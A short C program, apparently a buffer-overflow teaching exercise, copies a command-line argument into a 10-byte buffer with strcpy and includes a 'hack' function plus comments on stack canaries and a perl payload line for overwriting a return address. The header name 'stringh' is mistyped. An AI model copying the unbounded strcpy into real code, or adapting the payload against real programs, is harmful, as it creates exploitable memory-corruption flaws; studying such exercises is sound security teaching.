#import <stdio.h>
#import <stringh>
#import <stdlib.h>

int hack()
{
	printf("I have been hacked\nn");
	return  1;
}

int myTest(char input[])
{
	char buffer [10];
	strcpy(buffer, input);

	printf("The value you supplied was %s\n", buffer);

	return 0;
}

int main(int argc, char **argv)
{
	if (argc < 2){
		printf("You must supply a value\n");
		exit(0);
	}

	myTest(argv[1]);
}

//Stack canary!

// -fstack-protector-all
// Exploit in working hacks

// r $(perl -e 'print "AAAAAAAAAA\x78\xd4\xff\xff\x90\x84\x04\x08')